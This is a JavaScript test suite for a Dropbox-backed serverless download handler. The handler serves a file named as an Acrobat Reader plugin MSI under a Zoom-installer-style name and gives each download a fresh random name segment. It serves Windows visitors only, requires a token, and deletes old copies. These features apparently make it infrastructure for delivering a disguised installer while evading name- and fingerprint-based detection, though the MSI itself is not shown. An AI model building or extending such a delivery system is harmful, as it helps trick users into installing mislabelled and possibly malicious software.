import { test } from "node:test";
import assert from "node:assert/strict";
import {
  createDownloadHandler,
  buildDownloadName,
  generateRandomSegment,
  DEFAULT_NAME_TEMPLATE,
  DEFAULT_SOURCE_PATH,
  default as downloadHandler,
} from "../api/download.js";

const WINDOWS_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";

function fakeReq({ token = "tkn", userAgent = WINDOWS_UA } = {}) {
  return {
    query: { token },
    headers: { "user-agent": userAgent },
    socket: { remoteAddress: "9.9.9.9" },
  };
}

function fakeRes() {
  const res = {
    statusCode: 200,
    headers: {},
    body: "",
    setHeader(k, v) { res.headers[k.toLowerCase()] = v; },
    status(code) { res.statusCode = code; return res; },
    send(body) { res.body = body; return res; },
    end() { res.ended = true; },
  };
  return res;
}

// The handler ends the response and returns the cleanup promise, so awaiting the
// handler here also awaits the lazy sweep and the recorded calls stay assertable.
async function run(handler, req) {
  const res = fakeRes();
  await handler(req, res);
  return res;
}

/** Stub Dropbox client that records every call, in order. */
function stubDropbox({ link = "https://uc1.dl.dropboxusercontent.com/copy", entries = [], copyError = null, linkError = null } = {}) {
  const calls = [];
  return {
    calls,
    async copyFile(from_path, to_path) {
      calls.push({ endpoint: "files/copy_v2", from_path, to_path });
      if (copyError) throw new Error(copyError);
      return { metadata: { ".tag": "file", name: to_path.slice(1), path_lower: to_path.toLowerCase() } };
    },
    async getTemporaryLink(path) {
      calls.push({ endpoint: "files/get_temporary_link", path });
      if (linkError) throw new Error(linkError);
      return link;
    },
    async listFolder() {
      calls.push({ endpoint: "files/list_folder" });
      return entries;
    },
    async deleteFile(path) {
      calls.push({ endpoint: "files/delete_v2", path });
      return {};
    },
  };
}

const handlerFor = (stub, options = {}) =>
  createDownloadHandler({ dropbox: stub, sourcePath: DEFAULT_SOURCE_PATH, ...options });

test("copies the source file, then 302s to the copy's temporary link", async () => {
  const stub = stubDropbox({ link: "https://uc1.dl.dropboxusercontent.com/copy" });

  const res = await run(handlerFor(stub), fakeReq());

  assert.equal(res.statusCode, 302);
  assert.equal(res.headers.location, "https://uc1.dl.dropboxusercontent.com/copy");
  assert.ok(res.ended);

  const copy = stub.calls.find((c) => c.endpoint === "files/copy_v2");
  const link = stub.calls.find((c) => c.endpoint === "files/get_temporary_link");
  assert.ok(copy, "files/copy_v2 must be called");
  assert.equal(copy.from_path, DEFAULT_SOURCE_PATH, "the fixed source file is copied");
  assert.match(
    copy.to_path,
    /^\/Zoom_cm_fo42mnktZ9vvrZo4_[A-Za-z0-9_@-]{55}_k6c8493c377d76800_\.msi$/,
    "the copy carries the Zoom-style name with a 55-character random segment"
  );
  assert.equal(link.path, copy.to_path, "the link must be minted for the copy, not the source");
  assert.ok(
    stub.calls.indexOf(copy) < stub.calls.indexOf(link),
    "the copy must exist before its link is minted"
  );
});

test("the served file name changes from download to download", async () => {
  const stub = stubDropbox();
  const handler = handlerFor(stub);

  await run(handler, fakeReq({ token: "a" }));
  await run(handler, fakeReq({ token: "b" }));

  const names = stub.calls.filter((c) => c.endpoint === "files/copy_v2").map((c) => c.to_path);
  assert.equal(names.length, 2);
  assert.notEqual(names[0], names[1], "each download must get a fresh random segment");
});

test("sweep deletes only our own copies older than the TTL", async () => {
  const oldCopy = { ".tag": "file", name: "Zoom_cm_fo42mnktZ9vvrZo4_old_k6c8493c377d76800_.msi", path_lower: "/zoom_cm_fo42mnktZ9vvrZo4_old_k6c8493c377d76800_.msi", server_modified: "2026-01-01T00:00:00Z" };
  const freshCopy = { ".tag": "file", name: "Zoom_cm_fo42mnktZ9vvrZo4_fresh_k6c8493c377d76800_.msi", path_lower: "/zoom_cm_fo42mnktZ9vvrZo4_fresh_k6c8493c377d76800_.msi", server_modified: new Date().toISOString() };
  const source = { ".tag": "file", name: "AcrobatReaderPlugin_V26.8.102.msi", path_lower: "/acrobatreaderplugin_v26.8.102.msi", server_modified: "2026-01-01T00:00:00Z" };
  const folder = { ".tag": "folder", name: "Zoom_cm_fo42mnktZ9vvrZo4_not_a_file", path_lower: "/zoom_cm_fo42mnktZ9vvrZo4_not_a_file", server_modified: "2026-01-01T00:00:00Z" };
  const stub = stubDropbox({ entries: [source, oldCopy, freshCopy, folder] });

  await run(handlerFor(stub), fakeReq());

  const deleted = stub.calls.filter((c) => c.endpoint === "files/delete_v2").map((c) => c.path);
  assert.deepEqual(deleted, [oldCopy.path_lower], "only the old Zoom_cm_* file is deleted");
});

test("a failing sweep never breaks the download", async () => {
  const stub = stubDropbox();
  stub.listFolder = async () => { throw new Error("Dropbox 429 too_many_requests"); };

  const res = await run(handlerFor(stub), fakeReq());

  assert.equal(res.statusCode, 302);
  assert.ok(res.ended);
});

test("503 when the copy cannot be created, and no link is minted", async () => {
  const stub = stubDropbox({ copyError: "Dropbox 400 from https://api.dropboxapi.com/2/files/copy_v2: required scope files.content.write" });

  const res = await run(handlerFor(stub), fakeReq());

  assert.equal(res.statusCode, 503);
  assert.match(res.body, /unavailable/i);
  assert.ok(!stub.calls.some((c) => c.endpoint === "files/get_temporary_link"));
});

test("503 with a generic message when Dropbox cannot mint the link", async () => {
  const stub = stubDropbox({ linkError: "Dropbox 409: path/not_found" });

  const res = await run(handlerFor(stub), fakeReq());

  assert.equal(res.statusCode, 503);
  assert.match(res.body, /unavailable/i);
});

test("rejects a missing token without touching Dropbox", async () => {
  const stub = stubDropbox();

  const res = await run(handlerFor(stub), fakeReq({ token: "" }));

  assert.equal(res.statusCode, 400);
  assert.equal(stub.calls.length, 0, "Dropbox must not be called");
});

test("rejects non-Windows user agents without touching Dropbox", async () => {
  const stub = stubDropbox();

  const res = await run(handlerFor(stub), fakeReq({ userAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)" }));

  assert.equal(res.statusCode, 403);
  assert.equal(stub.calls.length, 0, "Dropbox must not be called");
});

test("generateRandomSegment returns a 55-character base64url-style segment", () => {
  const first = generateRandomSegment();
  const second = generateRandomSegment();

  assert.equal(first.length, 55);
  assert.match(first, /^[A-Za-z0-9_@-]{55}$/);
  assert.notEqual(first, second);
});

test("buildDownloadName puts the random segment between the fixed parts", () => {
  assert.equal(
    buildDownloadName(DEFAULT_NAME_TEMPLATE, "XYZ"),
    "Zoom_cm_fo42mnktZ9vvrZo4_XYZ_k6c8493c377d76800_.msi"
  );
});

/* -------- default (serverless) export -------- */

const ENV_KEYS = [
  "DROPBOX_APP_KEY",
  "DROPBOX_APP_SECRET",
  "DROPBOX_REFRESH_TOKEN",
  "DOWNLOAD_FILE_PATH",
  "DOWNLOAD_NAME_TEMPLATE",
  "DOWNLOAD_COPY_TTL_MINUTES",
];

function stubEnv(values) {
  const saved = {};
  for (const key of ENV_KEYS) {
    saved[key] = process.env[key];
    if (values && key in values) process.env[key] = values[key];
    else delete process.env[key];
  }
  return () => {
    for (const key of ENV_KEYS) {
      if (saved[key] === undefined) delete process.env[key];
      else process.env[key] = saved[key];
    }
  };
}

test("default export: 500 with a clear message when DROPBOX_* env vars are missing", async () => {
  const restore = stubEnv();
  try {
    const res = fakeRes();
    await downloadHandler(fakeReq({ token: "abc" }), res);
    assert.equal(res.statusCode, 500);
    assert.match(res.body, /misconfigured/i);
  } finally {
    restore();
  }
});

test("default export: copies and redirects via env config and global fetch", async () => {
  const restore = stubEnv({
    DROPBOX_APP_KEY: "k",
    DROPBOX_APP_SECRET: "s",
    DROPBOX_REFRESH_TOKEN: "r",
    DOWNLOAD_FILE_PATH: "/env-file.msi",
  });
  const realFetch = globalThis.fetch;
  const seen = [];
  const copies = [];
  globalThis.fetch = async (url, options) => {
    const u = String(url);
    seen.push(u);
    const json = (body) => ({ ok: true, status: 200, json: async () => body, text: async () => "{}" });
    if (u.endsWith("/oauth2/token")) return json({ access_token: "tok", expires_in: 14400 });
    if (u.endsWith("files/copy_v2")) {
      copies.push(JSON.parse(options.body));
      return json({ metadata: { ".tag": "file" } });
    }
    if (u.endsWith("files/list_folder")) return json({ entries: [], has_more: false });
    return json({ link: "https://uc1.dl.dropboxusercontent.com/env.msi" });
  };
  try {
    const res = fakeRes();
    await downloadHandler(fakeReq({ token: "abc" }), res);

    assert.equal(res.statusCode, 302);
    assert.equal(res.headers.location, "https://uc1.dl.dropboxusercontent.com/env.msi");
    assert.equal(copies.length, 1, "copy_v2 must be called once");
    assert.equal(copies[0].from_path, "/env-file.msi", "uses DOWNLOAD_FILE_PATH as the copy source");
    assert.match(
      copies[0].to_path,
      /^\/Zoom_cm_fo42mnktZ9vvrZo4_[A-Za-z0-9_@-]{55}_k6c8493c377d76800_\.msi$/
    );
    assert.ok(seen.some((u) => u.endsWith("files/get_temporary_link")));
  } finally {
    globalThis.fetch = realFetch;
    restore();
  }
});

test("sweep never deletes the copy the current request redirects to, even with a 0 TTL", async () => {
  const staleCopy = "/zoom_cm_fo42mnktZ9vvrZo4_old_k6c8493c377d76800_.msi";
  const stub = stubRequestAwareDropbox(staleCopy);

  const res = await run(handlerFor(stub, { copyTtlMinutes: 0 }), fakeReq());

  assert.equal(res.statusCode, 302, "the download itself still succeeds");
  const deleted = stub.calls.filter((c) => c.endpoint === "files/delete_v2").map((c) => c.path);
  assert.deepEqual(deleted, [staleCopy], "the older copy goes, the one just handed to the visitor stays");
});

/** Stub whose listing contains both an old copy and the copy this request just made. */
function stubRequestAwareDropbox(stalePath) {
  const calls = [];
  return {
    calls,
    async copyFile(from_path, to_path) {
      calls.push({ endpoint: "files/copy_v2", from_path, to_path });
      return {};
    },
    async getTemporaryLink() {
      return "https://uc1.dl.dropboxusercontent.com/x";
    },
    async listFolder() {
      const ownPath = calls.find((c) => c.endpoint === "files/copy_v2").to_path;
      return [
        { ".tag": "file", name: ownPath.slice(1), path_lower: ownPath.toLowerCase(), server_modified: new Date().toISOString() },
        { ".tag": "file", name: stalePath.slice(1), path_lower: stalePath, server_modified: new Date(Date.now() - 3_600_000).toISOString() },
      ];
    },
    async deleteFile(path) {
      calls.push({ endpoint: "files/delete_v2", path });
      return {};
    },
  };
}
